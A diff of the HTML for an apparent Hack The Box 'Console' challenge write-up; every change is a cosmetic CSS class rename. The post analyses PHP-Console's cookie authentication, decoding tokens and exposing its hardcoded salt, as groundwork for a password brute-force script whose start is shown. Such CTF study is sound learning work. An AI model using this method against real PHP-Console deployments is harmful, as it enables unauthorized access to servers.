@@ -215,12 +215,12 @@
     <p><strong><em>Console</em></strong> is a web challenge from <a href="https://www.hackthebox.eu/">hackthebox</a>, it’s explore development tools from PHP that is exposed.</p>
 
 <p>When you open the web page, you will notice a phpinfo() page with:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Your IP is 10.255.0.2
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Your IP is 10.255.0.2
 
 Make sure to load php-console in order to be prompted for a password
 </code></pre></div></div>
 
-<p>The first thing that came in my mind, was to look for this <code class="highlighter-rouge">php-console</code>, probably in <code class="highlighter-rouge">/php-console?some_rce_args=cat flag</code>, but nop, it’s far to be so easy. So i searched for <code class="highlighter-rouge">php-console</code> keyword, and i came up in this very crazy library <a href="https://github.com/barbushin/php-console">PHP-Console</a>.</p>
+<p>The first thing that came in my mind, was to look for this <code class="language-plaintext highlighter-rouge">php-console</code>, probably in <code class="language-plaintext highlighter-rouge">/php-console?some_rce_args=cat flag</code>, but nop, it’s far to be so easy. So i searched for <code class="language-plaintext highlighter-rouge">php-console</code> keyword, and i came up in this very crazy library <a href="https://github.com/barbushin/php-console">PHP-Console</a>.</p>
 
 <h2 id="php-console">PHP-Console</h2>
 
@@ -228,7 +228,7 @@ Make sure to load php-console in order to be prompted for a password
 
 <p>Both libraries are <strong><em>open source</em></strong> which allows us to inspect the source code and try to find some vuln that we can explore or take advantage of. But let’s try to understand how the Auth works.</p>
 
-<p><strong><em>Disclamer</em></strong> As a developer too, this tools looks very useful when you are <code class="highlighter-rouge">developing</code> something in PHP, and should not be deployed in production (obvious).</p>
+<p><strong><em>Disclamer</em></strong> As a developer too, this tools looks very useful when you are <code class="language-plaintext highlighter-rouge">developing</code> something in PHP, and should not be deployed in production (obvious).</p>
 
 <h2 id="chrome-extension">Chrome Extension</h2>
 
@@ -239,7 +239,7 @@ Make sure to load php-console in order to be prompted for a password
 <p>If you type anything inside this box, the page will be reloaded and nothing will happen. Now let’s analyze all the communication workflow with/without this extension.</p>
 
 <p>So, this is my request headers without the extension php-console:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: docker.hackthebox.eu:32741
 Connection: keep-alive
 Cache-Control: max-age=0
@@ -251,7 +251,7 @@ Accept-Language: en-US,en;q=0.9
 Cookie: php-console-server=5
 </code></pre></div></div>
 <p>This is the response <strong><em>without</em></strong> the extension:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Date: Sat, 18 Apr 2020 18:11:40 GMT
 Server: Apache/2.4.38 (Debian)
 X-Powered-By: PHP/7.2.28
@@ -264,7 +264,7 @@ Content-Type: text/html; charset=UTF-8
 </code></pre></div></div>
 
 <p>Now take a look into my request <strong><em>with</em></strong> the extension:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: docker.hackthebox.eu:32741
 Connection: keep-alive
 Cache-Control: max-age=0
@@ -277,7 +277,7 @@ Accept-Language: en-US,en;q=0.9
 Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjV9
 </code></pre></div></div>
 <p>Response:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Date: Sat, 18 Apr 2020 18:11:47 GMT
 Server: Apache/2.4.38 (Debian)
 X-Powered-By: PHP/7.2.28
@@ -295,17 +295,17 @@ Content-Type: text/html; charset=UTF-8
 
 <p>New cookie with random password:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiZDhjMzkyM2FkMWI5ZjJmMmJlZTQ2MzE2ZjEwNDM5Y2M3MGNiYTNkNTIxNDg2YWE3NWIwMjYyMmM2NTNlMDVkMCJ9fQ==
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiZDhjMzkyM2FkMWI5ZjJmMmJlZTQ2MzE2ZjEwNDM5Y2M3MGNiYTNkNTIxNDg2YWE3NWIwMjYyMmM2NTNlMDVkMCJ9fQ==
 </code></pre></div></div>
 
 <p>Good, now lets decode that and see what the extension is saving as a cookie:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"d8c3923ad1b9f2f2bee46316f10439cc70cba3d521486aa75b02622c653e05d0"}}
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"d8c3923ad1b9f2f2bee46316f10439cc70cba3d521486aa75b02622c653e05d0"}}
 </code></pre></div></div>
 
 <p>Ok, lets take a breath now, i took about 5-6 hours to beat this challenge, because the way the authentication works here is a bit crazy, the workflow is</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------+                +--------------+               +---------------------------+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------+                +--------------+               +---------------------------+
 |              |                |              |               |PHP-Console validate Cookie|
 | Get Password |                |Generate Token|  Post request |                           |
 |              +----------------+Set as Cookie +---------------&gt;                           |
@@ -325,7 +325,7 @@ Content-Type: text/html; charset=UTF-8
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>So the password hash, is a sha256 hash with a <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a>, the salt is <code class="highlighter-rouge">NeverChangeIt:)</code></p>
+<p>So the password hash, is a sha256 hash with a <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a>, the salt is <code class="language-plaintext highlighter-rouge">NeverChangeIt:)</code></p>
 
 <p>Token generator:</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">getAuthToken</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
@@ -355,14 +355,14 @@ Content-Type: text/html; charset=UTF-8
 
 <p>Now i will enter 123456 in the extension and see if i can get the same token, take a look at our request:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiNzA4YTcwMzI1MDlhZWQ2YWRmMDU1NjIzN2I4NDI0OTFjMGZlOTkwYzU4YjdiYzY2ZDM2YzMwYTYwMDRjNWIwOSJ9fQ==
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiNzA4YTcwMzI1MDlhZWQ2YWRmMDU1NjIzN2I4NDI0OTFjMGZlOTkwYzU4YjdiYzY2ZDM2YzMwYTYwMDRjNWIwOSJ9fQ==
 </code></pre></div></div>
 <p>Decoding:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"708a7032509aed6adf0556237b842491c0fe990c58b7bc66d36c30a6004c5b09"}}
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"708a7032509aed6adf0556237b842491c0fe990c58b7bc66d36c30a6004c5b09"}}
 </code></pre></div></div>
 
-<p>Good!! Now its possible to generate our custom <code class="highlighter-rouge">brute force</code> script :), i took a deep and long breath, made some coffe and started to code. And i came up with this php-console bruteforce script!</p>
+<p>Good!! Now its possible to generate our custom <code class="language-plaintext highlighter-rouge">brute force</code> script :), i took a deep and long breath, made some coffe and started to code. And i came up with this php-console bruteforce script!</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
 <span class="kn">import</span> <span class="nn">sys</span>
